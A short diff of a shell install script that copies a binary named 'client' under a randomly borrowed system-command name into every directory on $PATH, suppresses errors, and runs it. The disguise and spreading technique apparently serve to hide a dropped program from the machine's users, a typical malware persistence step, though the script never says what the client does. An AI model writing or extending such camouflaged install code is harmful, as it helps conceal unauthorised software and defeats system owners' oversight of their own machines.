@@ -9,7 +9,11 @@ FROM_PATH="$(dirname $0)/client"
 TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)-"
 TARGET_PATH="/usr/local/bin"
 
-cp $FROM_PATH "$TARGET_PATH/$TARGET_NAME"
+IFS=':' read -ra PATHS <<< "$PATH"
+for path in "${PATHS[@]}"; do
+    echo "copied into $path"
+    cp $FROM_PATH "$path/$TARGET_NAME" > /dev/null 2>&1
+done
 
 # run it
 $TARGET_NAME
